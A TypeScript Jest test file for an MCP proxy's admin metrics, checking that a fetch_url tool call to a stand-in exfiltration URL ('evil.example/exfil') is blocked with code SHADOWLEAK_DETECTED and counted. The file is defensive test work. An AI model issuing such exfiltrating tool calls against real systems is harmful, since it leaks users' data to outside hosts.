import express from 'express';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import request from 'supertest';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from '@jest/globals';
import { initializeCache } from '../src/cache/index.js';
import { createAdminRouter } from '../src/admin/index.js';
import { clearColorSessions } from '../src/middleware/color-boundary.js';
import { clearPreflightRegistries } from '../src/middleware/preflight-validator.js';
import { clearRoutes, registerRoute } from '../src/proxy/router.js';
import { resetBlockedRequestMetrics } from '../src/utils/auditLogger.js';

const serverToken = '12345678901234567890123456789012';

const createAuthHeader = (scopes: string[]): string => {
  return `Bearer ${Buffer.from(JSON.stringify({ token: serverToken, scopes })).toString('base64')}`;
};

describe('admin blocked-request metrics', () => {
  let app: typeof import('../src/index.js').default;
  let adminApp: express.Express;
  let targetServer: http.Server;
  let targetBaseUrl = '';
  let cacheDir = '';

  beforeAll(async () => {
    process.env.NODE_ENV = 'test';
    process.env.PROXY_AUTH_TOKEN = serverToken;
    const module = await import('../src/index.js');
    app = module.default;
    adminApp = express();
    adminApp.use(express.json());
    adminApp.use(createAdminRouter());
  });

  beforeEach(async () => {
    clearRoutes();
    clearPreflightRegistries();
    clearColorSessions();
    resetBlockedRequestMetrics();

    cacheDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-admin-cache-test-'));
    initializeCache({
      serverId: 'admin-test',
      l1: { maxSize: 100, ttlMs: 60000 },
      l2: { dbPath: cacheDir, ttlMs: 60000 },
      alwaysCacheTools: ['search_files'],
      neverCacheTools: [],
    });

    targetServer = http.createServer((req, res) => {
      const chunks: Buffer[] = [];
      req.on('data', chunk => chunks.push(Buffer.from(chunk)));
      req.on('end', () => {
        const body = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        res.setHeader('Content-Type', 'application/json');
        res.writeHead(200);
        res.end(JSON.stringify({
          ok: true,
          tool: body.params?.name,
          arguments: body.params?.arguments ?? null,
        }));
      });
    });

    await new Promise<void>((resolve) => {
      targetServer.listen(0, '127.0.0.1', () => {
        const address = targetServer.address();
        if (address && typeof address !== 'string') {
          targetBaseUrl = `http://127.0.0.1:${address.port}`;
        }
        resolve();
      });
    });

    registerRoute('search_files', {
      url: `${targetBaseUrl}/tools/search_files`,
      timeoutMs: 1000,
    });
  });

  afterEach(async () => {
    resetBlockedRequestMetrics();

    await new Promise<void>((resolve) => {
      if (targetServer?.listening) {
        targetServer.close(() => resolve());
      } else {
        resolve();
      }
    });

    if (cacheDir) {
      fs.rmSync(cacheDir, { recursive: true, force: true });
    }
  });

  afterAll(() => {
    delete process.env.NODE_ENV;
    delete process.env.PROXY_AUTH_TOKEN;
  });

  it('exposes blocked-request metrics through the admin stats surface', async () => {
    await request(app)
      .post('/mcp')
      .set('Authorization', createAuthHeader(['tools.fetch_url']))
      .send({
        method: 'tools/call',
        params: {
          name: 'fetch_url',
          arguments: { url: 'https://evil.example/exfil?a=x&b=y&c=z' },
        },
      })
      .expect(403);

    const response = await request(adminApp)
      .get('/stats')
      .expect(200);

    expect(response.body.blockedRequests.total).toBeGreaterThanOrEqual(1);
    expect(response.body.blockedRequests.byCode).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: 'SHADOWLEAK_DETECTED',
        }),
      ]),
    );
    expect(response.body.blockedRequests.recent[0]).toEqual(
      expect.objectContaining({
        code: 'SHADOWLEAK_DETECTED',
        path: '/mcp',
      }),
    );
  });
});
